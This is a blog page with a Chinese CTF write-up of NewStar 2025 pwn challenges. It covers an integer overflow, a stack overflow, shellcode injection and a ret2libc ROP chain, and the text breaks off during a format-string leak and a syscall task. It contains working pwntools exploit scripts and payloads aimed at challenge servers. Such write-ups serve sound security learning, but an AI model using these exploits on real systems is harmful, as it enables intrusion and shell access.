@@ -1,0 +1,933 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+    <link rel="canonical" href="https://yy-t1.github.io/2026/07/21/pwn/比赛/2025newstar/"/>
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="bsahfm">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1.GNU Debugger考查对gdb的使用 在gdb里: 先run ip 端口：启动程序 第一关查看r12的值（16进制）：  p &#x2F;x $r12 第二关查看某地址的字符串：x&#x2F;s 地址 第三关断点地址：b *地址 第四关改地址的值：set &#123;int&#125;0x7fffffffdaa4 &#x3D; 0xdeadbeef 查看x&#x2F;wx 0x7fffffffdaa4 即可 没成功重新启动容器">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025newstar">
+<meta property="og:url" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025newstar/index.html">
+<meta property="og:site_name" content="bsahfm">
+<meta property="og:description" content="1.GNU Debugger考查对gdb的使用 在gdb里: 先run ip 端口：启动程序 第一关查看r12的值（16进制）：  p &#x2F;x $r12 第二关查看某地址的字符串：x&#x2F;s 地址 第三关断点地址：b *地址 第四关改地址的值：set &#123;int&#125;0x7fffffffdaa4 &#x3D; 0xdeadbeef 查看x&#x2F;wx 0x7fffffffdaa4 即可 没成功重新启动容器">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1759162055525-18988b09-1350-4595-90d3-c40b0e6f3636.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1759162368716-68212922-d685-4bf7-ade8-fdf15af03a98.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1759194890231-8e474e74-acee-44c6-a1b8-6c8c00e51864.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1759195073226-0014c17c-8ea0-4419-bf84-06c2242082af.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1759195147847-3ae8e1cb-0f71-43bd-a131-d02adb5e0b8f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1760081074888-98845b16-8a2a-4274-914a-e49fe8cf08ef.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1760081204404-6845c976-36e1-498f-b9bb-47af86d6ea54.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1760058325195-55428f2f-7d4e-42a0-bb30-ea7d9bf401d1.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1760058341490-56673d20-cd75-4a9f-ad3e-be9c49eebe58.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1760066619310-9e2c1324-f87b-4dbc-96c2-8f9b7c8b4002.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1761395257482-170bc548-63a3-4637-b845-558c82b0ec81.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1761395287998-78e96e18-1404-4789-8d88-d4b7c401046c.png">
+<meta property="article:published_time" content="2026-07-21T14:14:06.000Z">
+<meta property="article:modified_time" content="2026-07-21T14:37:43.142Z">
+<meta property="article:author" content="bsahfm">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1759162055525-18988b09-1350-4595-90d3-c40b0e6f3636.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+        <meta name="google-site-verification" content="google24f795c42c9493e5.html" />
+  
+  <title>2025newstar - bsahfm</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"yy-t1.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"A72cL0RlIkmsXlCGMx51Qi51-gzGzoHsz","app_key":"xxsSPn2ge0tYPU7nwv5Gyd1r","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>tyy</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2025newstar"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-07-21 22:14" pubdate>
+          2026年7月21日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          47 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2025newstar</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="1-GNU-Debugger"><a href="#1-GNU-Debugger" class="headerlink" title="1.GNU Debugger"></a>1.GNU Debugger</h1><p>考查对gdb的使用</p>
+<p>在gdb里:</p>
+<p>先<code>run ip 端口</code>：启动程序</p>
+<p>第一关查看r12的值（16进制）：<code>  p /x $r12</code></p>
+<p>第二关查看某地址的字符串：<code>x/s 地址</code></p>
+<p>第三关断点地址：<code>b *地址</code></p>
+<p>第四关改地址的值：<code>set &#123;int&#125;0x7fffffffdaa4 = 0xdeadbeef</code> 查看<code>x/wx 0x7fffffffdaa4</code></p>
+<p>即可</p>
+<p>没成功重新启动容器在试试</p>
+<h1 id="2-INTbug"><a href="#2-INTbug" class="headerlink" title="2.INTbug"></a>2.INTbug</h1><h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><ol>
+<li>初始化v1为0</li>
+<li>循环输入v2，判断v2是否大于0</li>
+<li>每次循环时v1+1，判断v1是否小于0，若小于零，cat flag</li>
+</ol>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>因为v1为int16，16位有符号整数，取值范围为**-32768 到 32767**</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1759162055525-18988b09-1350-4595-90d3-c40b0e6f3636.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这里存在整数溢出，当程序执行32767+1次的时候，v1变成-32768</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>注意输入32768个数据，此数据量较大，需要time.sleep模拟用户正常输入，不然会被服务器阻止</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1759162368716-68212922-d685-4bf7-ade8-fdf15af03a98.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>AI优化过的：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>import time<br><br>p = remote(&#x27;8.147.134.121&#x27;, 39349)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">先接收可能的欢迎信息</span><br>print(p.recv(timeout=1))<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">慢速发送，模拟真实用户</span><br>for i in range(32768):<br>    p.sendline(b&#x27;1&#x27;)<br>    if i % 100 == 0:  # 每100次稍微停顿<br>        time.sleep(0.01)<br>    if i % 1000 == 0:<br>        print(f&quot;Progress: &#123;i&#125;/32768&quot;)<br><br>print(&quot;All inputs sent, waiting for response...&quot;)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="3-pwn’s-door"><a href="#3-pwn’s-door" class="headerlink" title="3.pwn’s door"></a>3.pwn’s door</h1><p>签到题</p>
+<p>输入指定数即可</p>
+<h1 id="4-overflow"><a href="#4-overflow" class="headerlink" title="4.overflow"></a>4.overflow</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>最基础的栈溢出控制返回地址到指定函数</p>
+<p>try函数里gets函数存在栈溢出漏洞</p>
+<p>gets:接收输入直到&#x2F;n或文件结束符为止</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1759194890231-8e474e74-acee-44c6-a1b8-6c8c00e51864.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>show函数干扰判断，其给出的函数地址不可getshell需要自己找backdoor</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1759195073226-0014c17c-8ea0-4419-bf84-06c2242082af.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1759195147847-3ae8e1cb-0f71-43bd-a131-d02adb5e0b8f.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>直接跳转到backdoor函数开头可能存在栈对齐的问题导致程序崩掉–&gt;跳转至执行getshell的地方即可</p>
+<h1 id="5-input-function"><a href="#5-input-function" class="headerlink" title="5.input_function"></a>5.input_function</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">int __fastcall main(int argc, const char **argv, const char **envp)<br>&#123;<br>  void *buf; // [rsp+8h] [rbp-8h]<br><br>  init(argc, argv, envp);<br>  buf = mmap((void *)0x114514, 0x1000u, 7, 34, -1, 0);<br>  puts(&quot;please input a function(after compile)&quot;);<br>  read(0, buf, 0x500u);<br>  ((void (*)(void))buf)();<br>  return 0;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>源代码一开始没看懂</p>
+<p>其实就是buf分配内存与mmap给予可写可执行权限</p>
+<p>最后用户输入buf，程序动态执行（将buf当作函数指针）</p>
+<p>所以直接shellcode即可</p>
+<h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)<br><br>p = process(&#x27;./pwn&#x27;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = remote(<span class="hljs-string">&#x27;47.94.87.199&#x27;</span>,38912)</span><br>p.recvuntil(&#x27;please input a function(after compile)&#x27;)<br>shellcode = asm(shellcraft.amd64.sh())<br><br>p.sendline(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><p>需要明确设置架构和操作系统。即设置context，不然程序会利用32位的来执行导致无法getshell</p>
+<h1 id="6-calc"><a href="#6-calc" class="headerlink" title="6.calc"></a>6.calc</h1><p>首先，代码有点长，但是经过代码审计3，4，5都不用看</p>
+<p>1是show，2.是改</p>
+<p>漏洞主要在改那里。</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">result = (<span class="hljs-name">__int64</span> *)(8LL * (<span class="hljs-name">int</span>)(<span class="hljs-name">num</span> - <span class="hljs-number">1</span>) + p_s)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>由于2那里没有判断0，所以这里有一个漏洞，通过gdb尝试发现刚好写在返回地址</p>
+<p>而栈布局上，返回地址后面接着的就是num1，2，3…(可以通过gdb调试证明）</p>
+<p>而且get_num只能接收一串数字，所以就需要通过num进行栈布局</p>
+<p>很明显题目没给system啥的，所以第一步就是想办法泄露libc的地址</p>
+<p>这里没有puts，根据plt表（gdb启动程序，输入plt就可以看到）以及代码审计，有printf，write，与beta_puts可以用</p>
+<p>首选write，但是没有找到相应的控制寄存器的gadget</p>
+<p>再次就是用beta_puts</p>
+<p>因为printf来泄露会存在许多问题。</p>
+<p>所以用beta_puts来打印地址。但是也有坑</p>
+<p>根据其代码，遇到\x00字节会停止打印，而plt表里我试了write，read都不可以，都有\x00字节，所以最后试了printf才成功的。构造gadget链最后记得返回main</p>
+<p>随后我想尝试one_gadget试试，但是失败了（脸要不要这么黑）</p>
+<p>最后给出exp：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>p = remote(&#x27;39.106.48.123&#x27;,44841)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span><br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)<br>elf = ELF(&#x27;./pwn&#x27;)<br>libc = ELF(&#x27;./libc.so.6&#x27;)<br>write_got =  elf.got[&#x27;write&#x27;]<br>printf = elf.got[&#x27;printf&#x27;]<br>read = elf.got[&#x27;read&#x27;]<br>print(write_got)<br><br>rdi_ret =  0x401253<br>bet_puts = 0x400857<br>main = 0x4010B4<br>ret = 0x4006b6<br><br><br><br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(b&#x27;1&#x27;)<br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(str(printf).encode())<br><br><br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(str(bet_puts).encode())<br><br><br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(b&#x27;3&#x27;)<br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(str(main).encode())<br><br><br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(b&#x27;0&#x27;)<br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(str(rdi_ret).encode())<br><br>data = p.recvline().strip()<br>data = u64(data.ljust(8,b&#x27;\x00&#x27;))<br>print(data)<br>print(hex(data))<br><br>libc_base = data - libc.symbols[&#x27;printf&#x27;]<br>system_addr = libc_base + libc.symbols[&#x27;system&#x27;]<br>bin_sh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))<br><br><br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(b&#x27;1&#x27;)<br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(str(bin_sh_addr).encode())<br><br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(str(ret).encode())<br><br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(b&#x27;3&#x27;)<br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(str(system_addr).encode())<br><br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt;&#x27;)<br>p.sendline(b&#x27;0&#x27;)<br>p.recvuntil(&#x27;&gt;&#x27;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">gdb.attach(p)</span><br>p.sendline(str(rdi_ret).encode())<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="7-刻在栈里的秘密"><a href="#7-刻在栈里的秘密" class="headerlink" title="7.刻在栈里的秘密"></a>7.刻在栈里的秘密</h1><p>无附件</p>
+<p>nc直接连</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc 39.106.48.123 32818<br>现在有一个密码隐藏在栈上(•̀ᴗ• )<br>你需要做的是通过格式化字符串来泄露这个密码o(´^｀)o！m, 告诉我密码我就给你flag<br>哦，对了对了，你还要告诉我指向这个密码的地址<br>在此之前, 你可以了解一下各个格式化字符串的用法, 例如 %p, %s, %d, 以及 $ 符号. emmm...还有 x86-64 函数调用约定!<br><br>指向密码的指针被存放在了 0x7ffd4088d800 中, 同时栈顶指针是 0x7ffd4088d780 .<br>他们之间的距离是:也就是说, 在printf之前, 格式字符串的参数看起来就像 ( *・ω・)<br><br>0x7ffd4088d800:	[?] &lt;-- 密码在这里捏<br>0x7ffd4088d7f8:	[?]<br>0x7ffd4088d7f0:	[?]<br>0x7ffd4088d7e8:	[?]<br>0x7ffd4088d7e0:	[?]<br>0x7ffd4088d7d8:	[?]<br>0x7ffd4088d7d0:	[?]<br>0x7ffd4088d7c8:	[?]<br>0x7ffd4088d7c0:	[?]<br>0x7ffd4088d7b8:	[?]<br>0x7ffd4088d7b0:	[?]<br>0x7ffd4088d7a8:	[?]<br>0x7ffd4088d7a0:	[?]<br>0x7ffd4088d798:	[?]<br>0x7ffd4088d790:	[?]<br>0x7ffd4088d788:	[?]<br>0x7ffd4088d780:	[?]<br>0x7ffd4088d778:	[?]<br>0x7ffd4088d770:	[?] &lt;-- 栈顶在这里捏<br>R9:		[?]<br>R8:		[?]<br>RCX:		[?]<br>RDX:		[?]<br>RSI:		[?]<br>RDI:		[格式化字符串]<br><br>现在给你两次输入的机会, 补要输入太长的数据哦. <br>接着我会使用printf, 用你的输入作为printf的参数. <br>看起来就像 printf(your_input), 实际上这样是很危险的, 好孩子不要模仿^^. 来吧让我看看你的输入<br></code></pre></td></tr></table></figure>
+
+<p>ps：栈上并不是直接对应于参数的</p>
+<p>其简易示意图</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">寄存器: [RDI=fmt][RSI=?][RDX=?][RCX=?][R8=?][R9=?]   &lt;-- 参数 1..6 在寄存器<br><br>栈（从低地址向高地址）<br>... saved rbp<br>... return address<br>... compiler spill/locals / register-save-area  &lt;-- 这里可能保存了一些寄存器的副本<br>[stack slot for param 7]<br>[stack slot for param 8]<br>[stack slot for param 9]<br>[stack slot for param 10]  &lt;-- 这里可能正好存了指向密码的指针<br>...<br></code></pre></td></tr></table></figure>
+
+<p>所以，第一步，写入很多%p</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1760081074888-98845b16-8a2a-4274-914a-e49fe8cf08ef.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>找到可能是指向栈上地址的位置1，5，9，10，11，21</p>
+<p>再%s来打印出对应指针指向的内容</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">%</span><span class="language-bash">1<span class="hljs-variable">$s</span>|%5<span class="hljs-variable">$s</span>|%9<span class="hljs-variable">$s</span>|%10<span class="hljs-variable">$s</span>|%11<span class="hljs-variable">$s</span>|%21<span class="hljs-variable">$s</span></span><br></code></pre></td></tr></table></figure>
+
+<p>找到密码在参数10的位置，打印相应指针填入即可获得flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1760081204404-6845c976-36e1-498f-b9bb-47af86d6ea54.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h1 id="8-syscall"><a href="#8-syscall" class="headerlink" title="8.syscall"></a>8.syscall</h1><p>题目以及告诉方向了，但还是花了很长时间</p>
+<p>附件代码很简单就是一个栈溢出</p>
+<p>checksec一下，32位程序，只有PIE没开</p>
+<p>查找&#x2F;bin&#x2F;sh</p>
